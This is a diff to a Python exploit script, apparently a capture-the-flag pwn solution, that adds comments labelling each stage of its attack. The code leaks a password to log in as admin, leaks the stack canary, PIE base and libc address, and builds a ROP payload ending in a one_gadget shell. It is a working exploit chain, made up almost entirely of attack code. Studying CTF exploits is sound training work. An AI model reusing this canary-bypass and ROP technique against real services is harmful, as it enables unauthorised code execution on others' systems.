@@ -16,12 +16,15 @@ def login(user,pw=""):
 def play():
 	p.sendlineafter("Your choice: ","2")
 def exploit(p):
+	# leak password
 	login("kt".ljust(0x20))
 	play()
 	p.recvuntil("kt".ljust(0x20))
 	pw=p.recv(0x10)
 	info("password is %s"%pw)
+	# login admin with password leaked
 	login("admin",pw)
+	# leak canary => bypass canary
 	play()
 	p.send("a"*0x29)
 	p.recvuntil("a"*0x29)
@@ -30,12 +33,14 @@ def exploit(p):
 	rdi=0x0000000000001023
 	p.send("a"*0x38)
 	p.recvuntil("a"*0x38)
+	# leak base binary => bypass PIE
 	basebin=u64(p.recv(6).ljust(8,"\x00"))-0xf8d
 	info("basebin = 0x%x"%basebin)
 	rdi+=basebin
 	atoigot=0x201FC8+basebin
 	puts=basebin+0x920
 	ret=basebin+0xf2d
+	# leak libc
 	payload="a"*0x28
 	payload+=p64(canary)
 	payload+=p64(0)
@@ -51,6 +56,7 @@ def exploit(p):
 	info("base libc 0x%x"%baselibc)
 	magic=baselibc+0x4f2c5
 	play()
+	# use one_gadget
 	payload='a'*0x28
 	payload+=p64(canary)
 	payload+=p64(0)
